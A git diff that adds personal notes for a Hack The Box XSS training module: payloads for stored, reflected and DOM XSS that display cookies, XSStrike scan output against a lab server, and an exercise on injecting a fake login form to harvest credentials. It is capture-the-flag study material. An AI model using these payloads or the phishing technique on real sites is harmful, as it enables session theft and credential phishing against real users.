@@ -180,4 +180,50 @@ Execution Sinks:
 
 # HTB Module questions
 ## Cross-Site Scripting (XSS)
+Stored XSS:
+To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url
+Payload: `<script>alert(document.cookie)</script>`
+Answer: In DevTools --> Storage --> cookie
+
+Reflected XSS:
+To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. 
+Payload: `<script>alert(document.cookie)</script>`
+Answer: Since it's an `alert()` the cookie is presented on the screen
+
+DOM XSS:
+To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.
+Payload: `<img src="" onerror=alert(document.cookie)>`
+Answer: Also an `alert()` so it's presented on screen
+
+XSS Discovery:
+Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter? 
+Payload / Answer:
+```
+┌──(v-env)(root㉿kali)-[~/XSStrike]
+└─# python xsstrike.py -u "http://94.237.54.192:57660/?fullname=fullname&username=usernmae&password=password&email=email%40email.com"        
+        XSStrike v3.1.5                                                                                                                                        
+[~] Checking for DOM vulnerabilities 
+[+] WAF Status: Offline 
+[!] Testing parameter: fullname 
+[-] No reflection found 
+[!] Testing parameter: username 
+[-] No reflection found 
+[!] Testing parameter: password 
+[-] No reflection found 
+[!] Testing parameter: email 
+[!] Reflections found: 1 
+[~] Analysing reflections 
+[~] Generating payloads 
+[!] Payloads generated: 3070 
+------------------------------------------------------------
+[+] Payload: <a%0donPoINterENTEr%09=%09confirm()%0dx>v3dm0s 
+[!] Efficiency: 100 
+[!] Confidence: 10 
+[?] Would you like to continue scanning? [y/N] 
+```
+XSStrike + env installed in root
+
+Phishing:
+Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag. 
+
 ## Advanced XSS and CSRF Exploitation
